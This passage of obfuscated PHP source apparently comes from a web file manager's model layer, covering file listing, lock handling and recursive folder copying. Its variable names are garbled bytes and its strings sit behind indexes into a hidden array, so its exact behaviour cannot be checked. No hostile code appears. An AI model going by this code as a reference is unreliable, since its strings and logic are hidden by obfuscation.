$ÍÂ¾éÍÊ[0] == $Ã©úºš… || !$ÍÂ¾éÍÊ && $©ÔŸî÷»[$ıêêìš«[204]] == $Ã©úºš…) { $Û•Û©Ì¯ = $Û•Û©Ì¯ . $ıêêìš«[624] . LNG($ıêêìš«[625]); } if (!$ÍÂ¾éÍÊ) { $©ÔŸî÷»[$ıêêìš«[32]] = $Û•Û©Ì¯; } } else { $¾ä²×° = Model($ıêêìš«[618])->getInfoFull($©ÔŸî÷»[$ıêêìš«[590]]); $çÁÓÀ¡ = _get($¾ä²×°, $ıêêìš«[620], $ıêêìš«[12]); $©ÔŸî÷»[$ıêêìš«[626]] = Model($ıêêìš«[598])->getInfoSimpleOuter($©ÔŸî÷»[$ıêêìš«[590]]); $Û•Û©Ì¯ = LNG($ıêêìš«[627]) . $ıêêìš«[186] . $©ÔŸî÷»[$ıêêìš«[626]][$ıêêìš«[32]] . $ıêêìš«[188]; if ($ÍÂ¾éÍÊ && $ÍÂ¾éÍÊ[0] == $çÁÓÀ¡ || !$ÍÂ¾éÍÊ && $©ÔŸî÷»[$ıêêìš«[204]] == $çÁÓÀ¡) { $Û•Û©Ì¯ = LNG($ıêêìš«[627]) . $ıêêìš«[628] . $©ÔŸî÷»[$ıêêìš«[626]][$ıêêìš«[32]] . $ıêêìš«[624] . LNG($ıêêìš«[625]) . $ıêêìš«[188]; } } } else { if ($©ÔŸî÷»[$ıêêìš«[201]] == self::TYPE_GROUP) { $à›æ™ñŠ = Model($ıêêìš«[606])->getInfoSimple($©ÔŸî÷»[$ıêêìš«[590]]); $Û•Û©Ì¯ = $à›æ™ñŠ[$ıêêìš«[32]]; } else { if ($©ÔŸî÷»[$ıêêìš«[201]] == self::TYPE_SYSTEM) { $Û•Û©Ì¯ = $ıêêìš«[629]; } } } $Û•Û©Ì¯ = $Û•Û©Ì¯ ? $ıêêìš«[8] . $Û•Û©Ì¯ . $ıêêìš«[8] : $ıêêìš«[8]; return $Û•Û©Ì¯; } protected function _listAppendUser(&$®øßƒß¦) { $ÏéÈƒ¸‘ =& $_SERVER[¬ÏÕ§Áú]; $âîá‰Û = array_to_keyvalue($®øßƒß¦, $ÏéÈƒ¸‘[12], $ÏéÈƒ¸‘[546]); $Ë–¿Êïï = array_to_keyvalue($®øßƒß¦, $ÏéÈƒ¸‘[12], $ÏéÈƒ¸‘[548]); $àİÅıüğ = array_merge($âîá‰Û, $Ë–¿Êïï); $»Š¤¹Å = Model($ÏéÈƒ¸‘[618])->userListInfo($àİÅıüğ); foreach ($®øßƒß¦ as &$˜ı…Œº) { $Ş°øåØº = $˜ı…Œº[$ÏéÈƒ¸‘[546]]; $˜ı…Œº[$ÏéÈƒ¸‘[546]] = $»Š¤¹Å[$Ş°øåØº] ? $»Š¤¹Å[$Ş°øåØº] : !1; $Ş°øåØº = $˜ı…Œº[$ÏéÈƒ¸‘[548]]; $˜ı…Œº[$ÏéÈƒ¸‘[548]] = $»Š¤¹Å[$Ş°øåØº] ? $»Š¤¹Å[$Ş°øåØº] : !1; if (_get($˜ı…Œº, $ÏéÈƒ¸‘[630], 0)) { $ËÇÂëêÅ = $GLOBALS[$ÏéÈƒ¸‘[6]][$ÏéÈƒ¸‘[102]][$ÏéÈƒ¸‘[631]]; if ($˜ı…Œº[$ÏéÈƒ¸‘[560]][$ÏéÈƒ¸‘[632]] <= time() - $ËÇÂëêÅ) { $this->metaSet($˜ı…Œº[$ÏéÈƒ¸‘[204]], $ÏéÈƒ¸‘[633], null); $this->metaSet($˜ı…Œº[$ÏéÈƒ¸‘[204]], $ÏéÈƒ¸‘[632], null); unset($˜ı…Œº[$ÏéÈƒ¸‘[560]][$ÏéÈƒ¸‘[633]]); continue; } $¸°¨œŒ = $˜ı…Œº[$ÏéÈƒ¸‘[560]][$ÏéÈƒ¸‘[633]]; $˜ı…Œº[$ÏéÈƒ¸‘[560]][$ÏéÈƒ¸‘[634]] = Model($ÏéÈƒ¸‘[618])->getInfoSimpleOuter($¸°¨œŒ); } } unset($˜ı…Œº); } public function parentLevelArray($¬°³Ò°) { $˜úÛãÚì =& $_SERVER[¬ÏÕ§Áú]; $¬°³Ò° = explode($˜úÛãÚì[50], trim($¬°³Ò°, $˜úÛãÚì[50])); return array_to_int(array_filter($¬°³Ò°)); } public function listAll($–Á¾¾¦â) { $‹øœû¯Æ =& $_SERVER[¬ÏÕ§Áú]; $¡Å†µºó = $this->sourceInfo($–Á¾¾¦â); $œ£ä¸§Ø = array($‹øœû¯Æ[635] => array($‹øœû¯Æ[636], $¡Å†µºó[$‹øœû¯Æ[605]] . $–Á¾¾¦â . $‹øœû¯Æ[637]), $‹øœû¯Æ[638] => 0); $äİß†“· = $‹øœû¯Æ[639]; $Êâå¬Ä‚ = "\114\x45\x46\124\40\112\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\x66\x69\x6c\145\40\146\151\x6c\x65\40\157\156\x20\163\x6f\165\x72\x63\x65\x2e\x66\151\x6c\145\x49\104\40\75\x20\x66\151\154\x65\x2e\146\151\x6c\x65\111\104"; $ˆ¶ÕÅà¥ = $this->alias($‹øœû¯Æ[538])->field($äİß†“·)->where($œ£ä¸§Ø)->join($Êâå¬Ä‚)->select(); $this->_listAppendAuth($ˆ¶ÕÅà¥); $this->_listAppendUser($ˆ¶ÕÅà¥); $this->_listAppendPath($ˆ¶ÕÅà¥); $ˆ¶ÕÅà¥ = array_to_keyvalue($ˆ¶ÕÅà¥, $‹øœû¯Æ[204]); $½˜­ÙÃæ = "\57{$¡Å†µºó[$‹øœû¯Æ[32]]}\x2f"; $½˜­ÙÃæ = $½˜­ÙÃæ == $‹øœû¯Æ[267] ? $‹øœû¯Æ[8] : $½˜­ÙÃæ; $½äåÙèî = array(); foreach ($ˆ¶ÕÅà¥ as $ù—íÙÀ => $˜¹¢ã“‘) { $ãú“Üè = $this->parentLevelArray($˜¹¢ã“‘[$‹øœû¯Æ[605]]); array_shift($ãú“Üè); $¾Ï¢ƒ‚ = $½˜­ÙÃæ; for ($ğıÀ´Ùƒ = 0; $ğıÀ´Ùƒ < count($ãú“Üè); $ğıÀ´Ùƒ++) { $¾Ï¢ƒ‚ .= $ˆ¶ÕÅà¥[$ãú“Üè[$ğıÀ´Ùƒ]][$‹øœû¯Æ[32]] . $‹øœû¯Æ[8]; } $¾Ï¢ƒ‚ .= $˜¹¢ã“‘[$‹øœû¯Æ[32]]; if ($˜¹¢ã“‘[$‹øœû¯Æ[505]]) { $¾Ï¢ƒ‚ .= $‹øœû¯Æ[8]; } $ç¼íÌÙû = array($‹øœû¯Æ[515] => str_replace($‹øœû¯Æ[267], $‹øœû¯Æ[8], str_replace($‹øœû¯Æ[267], $‹øœû¯Æ[8], str_replace($‹øœû¯Æ[267], $‹øœû¯Æ[8], $¾Ï¢ƒ‚))), $‹øœû¯Æ[640] => intval($˜¹¢ã“‘[$‹øœû¯Æ[505]]), $‹øœû¯Æ[641] => intval($˜¹¢ã“‘[$‹øœû¯Æ[89]]), $‹øœû¯Æ[98] => intval($˜¹¢ã“‘[$‹øœû¯Æ[98]]), $‹øœû¯Æ[100] => $this->pathInfoFilter($˜¹¢ã“‘)); if (!$ç¼íÌÙû[$‹øœû¯Æ[505]]) { $ç¼íÌÙû[$‹øœû¯Æ[562]] = $˜¹¢ã“‘[$‹øœû¯Æ[562]]; } $½äåÙèî[] = $ç¼íÌÙû; } $½äåÙèî = array_sort_by($½äåÙèî, $‹øœû¯Æ[97]); return $½äåÙèî; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ÔÉ®êÑ) { $Ş“üÛ½ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ş“üÛ½[642], $ÔÉ®êÑ); $óû½ğ¨ = 1; $this->_lockEvent($ÔÉ®êÑ, array($Ş“üÛ½[643], $Ş“üÛ½[644]), $óû½ğ¨); $this->_lockParent($ÔÉ®êÑ, array($Ş“üÛ½[644]), $óû½ğ¨); $this->_lockEvent($ÔÉ®êÑ, array($Ş“üÛ½[645], $Ş“üÛ½[646]), $óû½ğ¨); $this->_lockCheckEnd($Ş“üÛ½[642], $ÔÉ®êÑ); } public function lockCopyEnd($ŞúÃñ¢¼) { $ù¸üÂ£ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->allowLock()) { return; } $ƒÎîÏÅ = 0; $this->_lockEvent($ŞúÃñ¢¼, array($ù¸üÂ£[643], $ù¸üÂ£[644]), $ƒÎîÏÅ); $this->_lockParent($ŞúÃñ¢¼, array($ù¸üÂ£[644]), $ƒÎîÏÅ); $this->_lockEvent($ŞúÃñ¢¼, array($ù¸üÂ£[645], $ù¸üÂ£[646]), $ƒÎîÏÅ); } public function lockWriteStart($¼Ô­òÇ¿, $Âºç¬º  = '') { $¶ƒ©ğ‰ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->allowLock()) { return; } $this->_lockCheck($¶ƒ©ğ‰[643], $¼Ô­òÇ¿); $çô‡æ®  = 1; $this->_lockKey($¶ƒ©ğ‰[647] . $¼Ô­òÇ¿ . $¶ƒ©ğ‰[10] . $Âºç¬º , $çô‡æ® ); $this->_lockEvent($¼Ô­òÇ¿, array($¶ƒ©ğ‰[642], $¶ƒ©ğ‰[644]), $çô‡æ® ); $this->_lockParent($¼Ô­òÇ¿, array($¶ƒ©ğ‰[642], $¶ƒ©ğ‰[644]), $çô‡æ® ); $this->_lockCheckEnd($¶ƒ©ğ‰[643], $¼Ô­òÇ¿); } public function lockWriteEnd($ŒƒÂ–, $«Ø¦º = '') { $ÄÎŸîÓ¶ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->allowLock()) { return; } $¬¼•“ = 0; $this->_lockKey($ÄÎŸîÓ¶[647] . $ŒƒÂ– . $ÄÎŸîÓ¶[10] . $«Ø¦º, $¬¼•“); $this->_lockEvent($ŒƒÂ–, array($ÄÎŸîÓ¶[642], $ÄÎŸîÓ¶[644]), $¬¼•“); $this->_lockParent($ŒƒÂ–, array($ÄÎŸîÓ¶[642], $ÄÎŸîÓ¶[644]), $¬¼•“); } public function lockMoveStart($ùğÚáÁÓ) { $ÛÓù£æÕ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÛÓù£æÕ[644], $ùğÚáÁÓ); $ù¾œ’æÑ = 1; $this->_lockKey($ÛÓù£æÕ[648] . $ùğÚáÁÓ, $ù¾œ’æÑ); $this->_lockEvent($ùğÚáÁÓ, array($ÛÓù£æÕ[642], $ÛÓù£æÕ[643]), $ù¾œ’æÑ); $this->_lockParent($ùğÚáÁÓ, array($ÛÓù£æÕ[642], $ÛÓù£æÕ[644]), $ù¾œ’æÑ); $this->_lockEvent($ùğÚáÁÓ, array($ÛÓù£æÕ[649], $ÛÓù£æÕ[645], $ÛÓù£æÕ[646]), $ù¾œ’æÑ); $this->_lockCheckEnd($ÛÓù£æÕ[644], $ùğÚáÁÓ); } public function lockMoveEnd($œ§€Èš·) { $¸™†¦ñ =& $_SERVER[¬ÏÕ§Áú]; if (!$this->allowLock()) { return; } $ı´«ƒ‘û = 0; $this->_lockKey($¸™†¦ñ[648] . $œ§€Èš·, $ı´«ƒ‘û); $this->_lockEvent($œ§€Èš·, array($¸™†¦ñ[642], $¸™†¦ñ[643]), $ı´«ƒ‘û); $this->_lockParent($œ§€Èš·, array($¸™†¦ñ[642], $¸™†¦ñ[644]), $ı´«ƒ‘û); $this->_lockEvent($œ§€Èš·, array($¸™†¦ñ[649], $¸™†¦ñ[645], $¸™†¦ñ[646]), $ı´«ƒ‘û); } private function _lockCheck($Ÿ¼ƒ‚†ä, $óÒø“Ù´) { $¢Ü³¤È» =& $_SERVER[¬ÏÕ§Áú]; $ú§ğîˆ = $this->sourceInfo($óÒø“Ù´); $×¹ÕÊšô = $Ÿ¼ƒ‚†ä . $¢Ü³¤È»[10] . $óÒø“Ù´; $this->_lockTimeStart[$×¹ÕÊšô] = timeFloat(); if (!is_array($ú§ğîˆ)) { return; } $µ¿·¿®¦ = LNG($¢Ü³¤È»[650]); CacheLock::setErrorMsg($¢Ü³¤È»[186] . htmlspecialchars($ú§ğîˆ[$¢Ü³¤È»[32]]) . $¢Ü³¤È»[188] . $µ¿·¿®¦); $this->_lockKey($×¹ÕÊšô, 1); $this->_lockKey($×¹ÕÊšô, 0); $öğ­´Ïç = array_reverse($this->parentLevelArray($ú§ğîˆ[$¢Ü³¤È»[605]])); foreach ($öğ­´Ïç as $‰ñ¾€) { $×¹ÕÊšô = $Ÿ¼ƒ‚†ä . $¢Ü³¤È»[651] . $‰ñ¾€; if (CacheLock::lockGet($¢Ü³¤È»[652] . $×¹ÕÊšô)) { $ú§ğîˆ = $this->sourceInfo($‰ñ¾€); CacheLock::setErrorMsg($¢Ü³¤È»[186] . htmlspecialchars($ú§ğîˆ[$¢Ü³¤È»[32]]) . $¢Ü³¤È»[188] . $µ¿·¿®¦); $this->_lockKey($×¹ÕÊšô, 1); $this->_lockKey($×¹ÕÊšô, 0); } } } private function _lockCheckEnd($ªÌÕ–, $›«¦Éì) { $ò¡ûÍÍ£ =& $_SERVER[¬ÏÕ§Áú]; $ò÷ŸÆŠ = $ªÌÕ– . $ò¡ûÍÍ£[10] . $›«¦Éì; CacheLock::setErrorMsg($ò¡ûÍÍ£[69]); if (!isset($this->_lockTimeStart[$ò÷ŸÆŠ])) { return; } $£À™²ä = timeFloat() - $this->_lockTimeStart[$ò÷ŸÆŠ]; unset($this->_lockTimeStart[$ò÷ŸÆŠ]); if ($£À™²ä > 0.5) { unset(self::$cacheSourceInfo[$ò¡ûÍÍ£[552] . $›«¦Éì]); } $£š› Å¿ = $this->sourceInfo($›«¦Éì); if (!$£š› Å¿) { show_json(LNG($ò¡ûÍÍ£[118]), !1); } } private function _lockParent($ª÷Ø”¬ä, $ÑàÄŠõŒ, $¾¸‘†) { if (!$this->autoLockSet) { return; } $»Îï™ê = $this->sourceInfo($ª÷Ø”¬ä); if (!is_array($»Îï™ê)) { return; } $ğ‡ôºã¢ = array_reverse($this->parentLevelArray($»Îï™ê[$_SERVER[¬ÏÕ§Áú][605]])); foreach ($ğ‡ôºã¢ as $ÕŞ÷ÊÃØ) { $this->_lockEvent($ÕŞ÷ÊÃØ, $ÑàÄŠõŒ, $¾¸‘†); } } private function _lockEvent($ö®®©–Ö, $Ş‘äıÄÂ, $ÕÎÃ²) { $ªĞ«âôº =& $_SERVER[¬ÏÕ§Áú]; if (!$this->autoLockSet) { return; } foreach ($Ş‘äıÄÂ as $¨âğÂÖ) { $ ú²æÕ¡ = $¨âğÂÖ . $ªĞ«âôº[10] . $ö®®©–Ö; if ($ÕÎÃ² && CacheLock::lockGet($ªĞ«âôº[652] . $ ú²æÕ¡)) { continue; } $this->_lockKey($ ú²æÕ¡, $ÕÎÃ²); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($“˜‘Â£, $­óÔ÷™ = 1) { $Û¨ƒúª¾ = $_SERVER[¬ÏÕ§Áú][652] . md5($“˜‘Â£); if ($­óÔ÷™) { if (isset(self::$_lockItemArr[$Û¨ƒúª¾])) { return; } self::$_lockItemArr[$Û¨ƒúª¾] = 1; CacheLock::lock($Û¨ƒúª¾, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Û¨ƒúª¾])) { return; } unset(self::$_lockItemArr[$Û¨ƒúª¾]); CacheLock::unlock($Û¨ƒúª¾); } } public function isParentOf($˜ ÕïŸ¶, $˜«¥º§) { $ôí–¹š³ =& $_SERVER[¬ÏÕ§Áú]; $É„†Ô°“ = $this->sourceInfo($˜ ÕïŸ¶); $—íö¶ıü = $this->sourceInfo($˜«¥º§); $Áæ•–¿™ = $É„†Ô°“[$ôí–¹š³[605]] . $É„†Ô°“[$ôí–¹š³[204]] . $ôí–¹š³[50]; $¤‡‹¿ = $—íö¶ıü[$ôí–¹š³[605]] . $—íö¶ıü[$ôí–¹š³[204]] . $ôí–¹š³[50]; $±æ¯ÍÀ– = strpos($¤‡‹¿, $Áæ•–¿™) === 0; return $±æ¯ÍÀ–; } private $targetIsDelete = 0; public function copy($áè›Áßß, $×¼ö˜õ, $şƒÁı²â = REPEAT_REPLACE, $â†‘Ğşó = '') { $ûè³ŞàÔ =& $_SERVER[¬ÏÕ§Áú]; $íêËÙ·Š = $this->sourceInfo($áè›Áßß); $Âç±ı× = $this->sourceInfo($×¼ö˜õ); if (!$íêËÙ·Š || !$Âç±ı× || $Âç±ı×[$ûè³ŞàÔ[505]] != $ûè³ŞàÔ[101]) { return !1; } if ($this->isParentOf($áè›Áßß, $×¼ö˜õ)) { return !1; } $¡Ñ³Ìùœ = $â†‘Ğşó ? $â†‘Ğşó : $íêËÙ·Š[$ûè³ŞàÔ[32]]; $this->lockCopyStart($áè›Áßß); $this->lockWriteStart($×¼ö˜õ, $¡Ñ³Ìùœ); $â£Æß‰Ï = array($ûè³ŞàÔ[653] => array(), $ûè³ŞàÔ[654] => array(), $ûè³ŞàÔ[655] => array()); $this->targetIsDelete = intval($íêËÙ·Š[$ûè³ŞàÔ[525]]); $ÅŒÓÎÙˆ = $this->fileNameExistAuto($×¼ö˜õ, $íêËÙ·Š); $Ç´‘ÊŸ£ = $this->_copy($áè›Áßß, $×¼ö˜õ, $şƒÁı²â, $â£Æß‰Ï, !0, $â†‘Ğşó); $this->_childrenListClear(); $this->lockCopyEnd($áè›Áßß); $this->lockWriteEnd($×¼ö˜õ, $¡Ñ³Ìùœ); if ($íêËÙ·Š[$ûè³ŞàÔ[505]] == $ûè³ŞàÔ[101] && $ÅŒÓÎÙˆ == $Ç´‘ÊŸ£) { $this->folderSizeResetChildren($ÅŒÓÎÙˆ); } Model($ûè³ŞàÔ[656])->addAll($â£Æß‰Ï[$ûè³ŞàÔ[654]], array(), !0); if ($ÅŒÓÎÙˆ != $Ç´‘ÊŸ£ || $íêËÙ·Š[$ûè³ŞàÔ[505]] == $ûè³ŞàÔ[101]) { Model($ûè³ŞàÔ[657])->eventCopy($Ç´‘ÊŸ£); } $this->saveAll($â£Æß‰Ï[$ûè³ŞàÔ[655]]); Model($ûè³ŞàÔ[243])->linkAdd($â£Æß‰Ï[$ûè³ŞàÔ[653]]); $this->folderSizeReset($×¼ö˜õ); $this->updateModifyTime($×¼ö˜õ); return $Ç´‘ÊŸ£; } private function _copy($Åò¢Š•, $Š„ã§ü, $áÆ¡ÛŠæ, &$çéº†ÈŒ, $âüÒÆçé, $ê–‚ÖÂŞ = '') { $ü—ô×åÛ =& $_SERVER[¬ÏÕ§Áú]; $«ö³¥Û“ = $this->sourceInfoCache($Åò¢Š•); $®şåºì¾ = $«ö³¥Û“[$ü—ô×åÛ[505]] == $ü—ô×åÛ[101]; $’Áê˜ğÃ = $ê–‚ÖÂŞ ? $ê–‚ÖÂŞ : $«ö³¥Û“[$ü—ô×åÛ[32]]; $æÛ¹òõÁ = $this->fileNameExistAuto($Š„ã§ü, $«ö³¥Û“); if ($âüÒÆçé) { $this->_childrenAllMake($Åò¢Š•); if ($®şåºì¾ && $æÛ¹òõÁ) { $this->_childrenAllMake($æÛ¹òõÁ); } } if (!$æÛ¹òõÁ) { return $this->_copyCreate($Åò¢Š•, $Š„ã§ü, $’Áê˜ğÃ, $çéº†ÈŒ); } $©£•àù¬ = $æÛ¹òõÁ; if ($®şåºì¾) { if ($áÆ¡ÛŠæ == REPEAT_RENAME_FOLDER) { $’Áê˜ğÃ = $this->fileNameAutoCache($Š„ã§ü, $’Áê˜ğÃ, $áÆ¡ÛŠæ, $®şåºì¾); $©£•àù¬ = $this->_copyCreate($Åò¢Š•, $Š„ã§ü, $’Áê˜ğÃ, $çéº†ÈŒ); } else { $òÃŞ±¿  = $this->_childrenList($Åò¢Š•); foreach ($òÃŞ±¿  as $ƒ”«ˆ) { $this->_copy($ƒ”«ˆ[$ü—ô×åÛ[204]], $æÛ¹òõÁ, $áÆ¡ÛŠæ, $çéº†ÈŒ, !1); } } } else { if ($áÆ¡ÛŠæ == REPEAT_RENAME || $áÆ¡ÛŠæ == REPEAT_RENAME_FOLDER) { $’Áê˜ğÃ = $this->fileNameAutoCache($Š„ã§ü, $’Áê˜ğÃ, $áÆ¡ÛŠæ, $®şåºì¾); $©£•àù¬ = $this->_copyCreate($Åò¢Š•, $Š„ã§ü, $’Áê˜ğÃ, $çéº†ÈŒ); } else { if ($áÆ¡ÛŠæ == REPEAT_REPLACE) { $¦¿‚Øî¥ = $this->sourceInfoCache($æÛ¹òõÁ); $¯°¸ı„ = $this->fileHistory($¦¿‚Øî¥, $«ö³¥Û“[$ü—ô×åÛ[562]], $«ö³¥Û“[$ü—ô×åÛ[89]]); if ($¯°¸ı„) { $çéº†ÈŒ[$ü—ô×åÛ[653]][] = $«ö³¥Û“[$ü—ô×åÛ[562]]; } } else { if ($áÆ¡ÛŠæ == REPEAT_SKIP) { } } } Hook::trigger($ü—ô×åÛ[658], array($ü—ô×åÛ[659], $«ö³¥Û“, 0)); } return $©£•àù¬; } private function _copyCreate($ÁğÓ¹ÏÎ, $”™¾•Ì€, $ÒîªŠß÷, &$ªş…¹ö) { $¬Ù÷ıûç =& $_SERVER[¬ÏÕ§Áú]; $Ö³¶Û–— = $this->sourceInfoCache($ÁğÓ¹ÏÎ); $àµîâß› = $this->sourceInfoCache($”™¾•Ì€); $Ä±¦†­¯ = $this->_makeItemData($Ö³¶Û–—, $àµîâß›, $ÒîªŠß÷); Hook::trigger($¬Ù÷ıûç[660], $Ä±¦†­¯); Hook::trigger($¬Ù÷ıûç[661], array($¬Ù÷ıûç[662], $Ä±¦†­¯, 0)); $ˆóğˆ• = $this->add($Ä±¦†­¯); $™®çÜˆæ = array($¬Ù÷ıûç[204] => $ˆóğˆ•, $¬Ù÷ıûç[32] => $ÒîªŠß÷); $this->_copyApplyMeta($™®çÜˆæ, $ªş…¹ö); if ($Ö³¶Û–—[$¬Ù÷ıûç[505]] != $¬Ù÷ıûç[101]) { $ªş…¹ö[$¬Ù÷ıûç[653]][] = $Ö³¶Û–—[$¬Ù÷ıûç[562]]; return $ˆóğˆ•; } $ç¢Ğ‡• = array(); $òÇ¥†ÜÈ = array(); $this->_childrenListAll($ÁğÓ¹ÏÎ, $ç¢Ğ‡•); $ÂÇıÚ« = count($ç¢Ğ‡•); if ($ÂÇıÚ« == 0) { return $ˆóğˆ•; } $ÂïöåÔ™ = $this->sourceInfo($ˆóğˆ•); foreach ($ç¢Ğ‡• as $ÜİÅ‹à) { $¤ÂçüÎ™ = $this->_makeItemData($ÜİÅ‹à, $ÂïöåÔ™, $ÜİÅ‹à[$¬Ù÷ıûç[32]]); $¤ÂçüÎ™[$¬Ù÷ıûç[605]] = $ÜİÅ‹à[$¬Ù÷ıûç[605]]; $òÇ¥†ÜÈ[] = $¤ÂçüÎ™; } $this->chunkEventSet($¬Ù÷ıûç[663], array($¬Ù÷ıûç[664], $Ä±¦†­¯, $ÂÇıÚ«)); $this->addAll($òÇ¥†ÜÈ, array(), !1); $’ôªÛ = $this->where(array($¬Ù÷ıûç[203] => $ˆóğˆ•))->select(); $è¡—¥± = $this->_childrenMakeRelation($ç¢Ğ‡•, $’ôªÛ); $è¡—¥±[$ÁğÓ¹ÏÎ] = $ˆóğˆ•; $áÂ’à¼ã = array(); $ç…©¬º® = array(); foreach ($’ôªÛ as $ÜİÅ‹à) { $Ñ¶ÓÄÇÜ = $ÜİÅ‹à[$¬Ù÷ıûç[204]]; $şß’áóÚ = $this->_childrenMatch($è¡—¥±, $ÜİÅ‹à, $ÂïöåÔ™); $áÂ’à¼ã[] = array($¬Ù÷ıûç[204], $Ñ¶ÓÄÇÜ, $¬Ù÷ıûç[203], $şß’áóÚ[$¬Ù÷ıûç[203]]); $ç…©¬º®[] = array($¬Ù÷ıûç[204], $Ñ¶ÓÄÇÜ, $¬Ù÷ıûç[605], $şß’áóÚ[$¬Ù÷ıûç[605]]); $this->_copyApplyMeta($ÜİÅ‹à, $ªş…¹ö); if ($ÜİÅ‹à[$¬Ù÷ıûç[505]] != $¬Ù÷ıûç[101]) { $ªş…¹ö[$¬Ù÷ıûç[653]][] = $ÜİÅ‹à[$¬Ù÷ıûç[562]]; } } $this->chunkEventSet($¬Ù÷ıûç[665], array($¬Ù÷ıûç[666], $Ä±¦†­¯, $ÂÇıÚ«)); $this->saveAll($áÂ’à¼ã); $this->chunkEventSet($¬Ù÷ıûç[667], array($¬Ù÷ıûç[668], $Ä±¦†­¯, $ÂÇıÚ«)); $this->saveAll($ç…©¬º®); return $ˆóğˆ•; } private function _childrenMakeRelation($çîÄˆ´Ï, $á›¹Ä¶¨) { $„¨ÔÛäÑ =& $_SERVER[¬ÏÕ§Áú]; $¦ÑÍÁ·• = array(); $›ŸË§Ã = array(); foreach ($çîÄˆ´Ï as $‚½óßÂ¶) { $ıÅË´Ï¯ = $‚½óßÂ¶[$„¨ÔÛäÑ[32]] . $„¨ÔÛäÑ[8] . $‚½óßÂ¶[$„¨ÔÛäÑ[605]]; $¦ÑÍÁ·•[$ıÅË´Ï¯] = $‚½óßÂ¶[$„¨ÔÛäÑ[204]]; } foreach ($á›¹Ä¶¨ as $‚½óßÂ¶) { $ıÅË´Ï¯ = $‚½óßÂ¶[$„¨ÔÛäÑ[32]] . $„¨ÔÛäÑ[8] . $‚½óßÂ¶[$„¨ÔÛäÑ[605]]; $”íò²Ã» = $¦ÑÍÁ·•[$ıÅË´Ï¯]; $›ŸË§Ã[$”íò²Ã»] = $‚½óßÂ¶[$„¨ÔÛäÑ[204]]; } return $›ŸË§Ã; } private function _childrenMatch($ÄÎ÷Ê, $½¢ïúÔÑ, $¶»¦³Ò¢) { $ÉšØ¡£¶ =& $_SERVER[¬ÏÕ§Áú]; $êè«çµ© = $¶»¦³Ò¢[$ÉšØ¡£¶[605]]; $ÄÌˆ®ş = $this->parentLevelArray($½¢ïúÔÑ[$ÉšØ¡£¶[605]]); foreach ($ÄÌˆ®ş as $“çá¿äÕ) { if (isset($ÄÎ÷Ê[$“çá¿äÕ])) { $êè«çµ© .= $ÄÎ÷Ê[$“çá¿äÕ] . $ÉšØ¡£¶[669]; } } $êè«çµ© = rtrim($êè«çµ©, $ÉšØ¡£¶[50]) . $ÉšØ¡£¶[50]; $øì–¤ Ù = $this->parentLevelArray($êè«çµ©); $®ÃË„É = $øì–¤ Ù[count($øì–¤ Ù) - 1]; return array($ÉšØ¡£¶[203] => $®ÃË„É, $ÉšØ¡£¶[605] => $êè«çµ©); } private function _makeItemData($ïüšú¶í, $è ˜Áı, $ü ş¸è) { $à½ËŸÄ… =& $_SERVER[¬ÏÕ§Áú]; $íô¿¶« = array($à½ËŸÄ…[670] => $ïüšú¶í[$à½ËŸÄ…[505]], $à½ËŸÄ…[514] => $ü ş¸è, $à½ËŸÄ…[671] => $ïüšú¶í[$à½ËŸÄ…[506]] ? $ïüšú¶í[$à½ËŸÄ…[506]] : $à½ËŸÄ…[12], $à½ËŸÄ…[563] => $ïüšú¶í[$à½ËŸÄ…[562]] ? $ïüšú¶í[$à½ËŸÄ…[562]] : 0, $à½ËŸÄ…[641] => $ïüšú¶í[$à½ËŸÄ…[89]] ? $ïüšú¶í[$à½ËŸÄ…[89]] : 0, $à½ËŸÄ…[672] => intval($è ˜Áı[$à½ËŸÄ…[201]]), $à½ËŸÄ…[673] => intval($è ˜Áı[$à½ËŸÄ…[590]]), $à½ËŸÄ…[674] => intval(USER_ID), $à½ËŸÄ…[675] => intval(USER_ID), $à½ËŸÄ…[497] => intval($è ˜Áı[$à½ËŸÄ…[204]]), $à½ËŸÄ…[676] => $è ˜Áı[$à½ËŸÄ…[605]] . $è ˜Áı[$à½ËŸÄ…[204]] . $à½ËŸÄ…[50], $à½ËŸÄ…[518] => $ïüšú¶í[$à½ËŸÄ…[98]] ? $ïüšú¶í[$à½ËŸÄ…[98]] : time(), $à½ËŸÄ…[524] => 0, $à½ËŸÄ…[677] => $à½ËŸÄ…[12]); return $íô¿¶«; } private function _copyApplyMeta($ƒ˜²æ›œ, &$ã¿Œ‹«±) { $¦Ö‰ÎÍ’ =& $_SERVER[¬ÏÕ§Áú]; $ÖİîÌñÄ = $ƒ˜²æ›œ[$¦Ö‰ÎÍ’[204]]; $ç—Şƒö = $ƒ˜²æ›œ[$¦Ö‰ÎÍ’[32]]; if (!isset($ƒ˜²æ›œ[$¦Ö‰ÎÍ’[678]]) || !$ƒ˜²æ›œ[$¦Ö‰ÎÍ’[678]] || $ƒ˜²æ›œ[$¦Ö‰ÎÍ’[678]] == $¦Ö‰ÎÍ’[241]) { $ã¿Œ‹«±[$¦Ö‰ÎÍ’[655]][] = array($¦Ö‰ÎÍ’[204], $ÖİîÌñÄ, $¦Ö‰ÎÍ’[678], short_id($ÖİîÌñÄ)); } if (Input::check($ç—Şƒö, $¦Ö‰ÎÍ’[679])) { $ã¿Œ‹«±[$¦Ö‰ÎÍ’[654]][] = array($¦Ö‰ÎÍ’[204] => $ÖİîÌñÄ, $¦Ö‰ÎÍ’[107] => $¦Ö‰ÎÍ’[557], $¦Ö‰ÎÍ’[461] => str_replace($¦Ö‰ÎÍ’[53], $¦Ö‰ÎÍ’[12], Pinyin::get($ç—Şƒö))); $ã¿Œ‹«±[$¦Ö‰ÎÍ’[654]][] = array($¦Ö‰ÎÍ’[204] => $ÖİîÌñÄ, $¦Ö‰ÎÍ’[107] => $¦Ö‰ÎÍ’[556], $¦Ö‰ÎÍ’[461] => Pinyin::get($ç—Şƒö, $¦Ö‰ÎÍ’[680])); } $ã¿Œ‹«±[$¦Ö‰ÎÍ’[654]][] = array($¦Ö‰ÎÍ’[204] => 